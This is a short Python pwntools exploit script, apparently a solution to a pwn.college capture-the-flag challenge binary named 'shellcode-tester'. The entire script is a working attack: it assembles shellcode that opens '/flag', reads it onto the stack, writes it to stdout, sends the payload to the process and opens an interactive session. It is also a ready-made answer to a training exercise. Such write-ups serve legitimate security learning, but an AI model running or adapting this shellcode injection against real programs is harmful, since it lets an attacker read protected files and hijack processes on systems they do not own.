from pwn import *

# ==========================================
# CONFIGURATION
# ==========================================

BINARY = "./shellcode-tester"

context.binary = ELF(BINARY, checksec=False)
context.arch = context.binary.arch
context.log_level = "debug"

elf = context.binary

# ==========================================
# CONNECTION
# ==========================================

io = process(BINARY)

# ==========================================
# EXPLOIT 
# ==========================================

def exploit(io):
    
    sc = shellcraft.open('/flag')
    sc += shellcraft.read(3 , 'rsp'  , 0x100)
    sc += shellcraft.write(1, 'rsp' , 0x100)
    
    print(asm(sc).hex())
    
    payload = asm(sc)
    
    sleep(0.5) 
    io.send(payload)
    
    res = io.recvuntil(b'pwn.college')
    
    print(res.decode())


# ==========================================
# MAIN
# ==========================================

def main():

    exploit(io)

    io.interactive()


if __name__ == "__main__":
    main()
